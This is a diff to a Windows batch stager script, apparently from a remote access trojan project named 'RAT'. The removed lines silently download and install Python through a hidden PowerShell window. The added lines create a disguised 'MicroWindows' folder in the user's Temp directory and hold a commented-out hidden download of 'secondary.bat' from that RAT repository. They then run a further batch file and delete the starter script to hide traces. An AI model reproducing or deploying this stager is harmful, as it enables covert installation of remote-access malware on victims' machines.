@@ -1,3 +1,8 @@
-mkdir c:\temp
-powershell powershell.exe -windowstyle hidden Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.7.0/python-3.7.0.exe" -OutFile "c:/temp/python-3.7.0.exe"
-c:/temp/python-3.7.0.exe /quiet InstallAllUsers=0 PrependPath=1 Include_test=0
+mkdir C:\Users\%username%\AppData\Local\Temp\MicroWindows
+@rem powershell powershell.exe -windowstyle hidden curl https://raw.githubusercontent.com/saifnasef/RAT/main/secondary.bat -o C:/Users/%username%/AppData/Local/Temp/MicroWindows/secondary.bat
+timeout 5
+
+cd C:\Users\%username%\AppData\Local\Temp\MicroWindows
+hello.bat
+cd %currentd%
+del Starter.bat
